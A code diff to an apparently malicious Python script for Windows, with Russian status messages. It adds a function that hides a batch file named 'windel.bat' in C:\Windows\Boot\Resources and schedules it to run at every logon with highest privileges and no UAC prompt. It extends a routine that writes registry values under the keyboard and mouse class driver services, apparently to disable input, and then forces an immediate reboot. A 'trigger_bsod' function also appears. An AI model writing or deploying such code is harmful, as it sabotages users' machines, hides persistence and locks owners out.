@@ -111,10 +111,53 @@ def set_reg_value(hive, path: str, name: str, value, value_type=winreg.REG_SZ) -
     with winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE) as key:
         winreg.SetValueEx(key, name, 0, value_type, value)
     print(f"[OK] {path}\\{name} = {value}")
-    
+
+def bat_to_autoload():
+    project_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    bat_path = os.path.join(project_dir, "windel.bat")
+    if not os.path.isfile(bat_path):
+        print("Файл не найден.")
+        return
+
+    dest_dir = r"C:\Windows\Boot\Resources"
+    os.makedirs(dest_dir, exist_ok=True)
+
+    dest = os.path.join(dest_dir, os.path.basename(bat_path))
+
+    if os.path.abspath(bat_path) != os.path.abspath(dest):
+        shutil.move(bat_path, dest)
+        print(f"Перемещено: {bat_path} -> {dest}")
+    else:
+        print("Файл уже находится в нужной папке.")
+
+    task_name = "MyBatTask"
+
+    subprocess.run(["schtasks", "/Delete", "/TN", task_name, "/F"],
+                   capture_output=True)
+
+    result = subprocess.run([
+        "schtasks", "/Create",
+        "/TN", task_name,
+        "/TR", f'"{dest}"',
+        "/SC", "ONLOGON",
+        "/RL", "HIGHEST",
+        "/F"
+    ], capture_output=True, text=True)
+
+    if result.returncode == 0:
+        print(f"\n✔ Задача '{task_name}' создана.")
+        print(f"✔ Батник: {dest}")
+        print("✔ Будет запускаться при входе в систему от админа без UAC.")
+    else:
+        print("Ошибка создания задачи:")
+        print(result.stdout)
+        print(result.stderr)
+
 def block_input(block=True):
-    set_reg_value(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services", "kbdclass", 4, winreg.REG_DWORD)
-    set_reg_value(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services", "mouclass", 4, winreg.REG_DWORD)
+    set_reg_value(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", "kbdclass", 4, winreg.REG_DWORD)
+    set_reg_value(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", "mouclass", 4, winreg.REG_DWORD)
+    bat_to_autoload()
+    os.system("shutdown /r /t 0")
     return user32.BlockInput(block)
 
 def trigger_bsod():
